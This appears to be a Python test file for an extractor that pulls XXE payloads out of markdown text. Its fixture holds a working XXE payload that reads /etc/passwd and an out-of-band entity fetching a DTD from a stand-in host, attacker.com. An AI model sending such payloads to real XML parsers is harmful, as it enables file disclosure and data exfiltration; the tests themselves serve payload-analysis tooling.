from src.extractors import EXTRACTORS
from src.extractors.xxe import extract

MD = """
Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

Out-of-band variant uses `<!ENTITY % remote SYSTEM "http://attacker.com/e.dtd">`.
"""


def payloads():
    return [c.payload for c in extract(1, MD)]


def test_finds_doctype_entity():
    assert any("<!DOCTYPE" in p for p in payloads())


def test_finds_system_file_entity():
    assert any("file:///etc/passwd" in p for p in payloads())


def test_finds_parameter_entity():
    assert any("<!ENTITY %" in p for p in payloads())


def test_registered():
    assert EXTRACTORS["xxe"] is extract
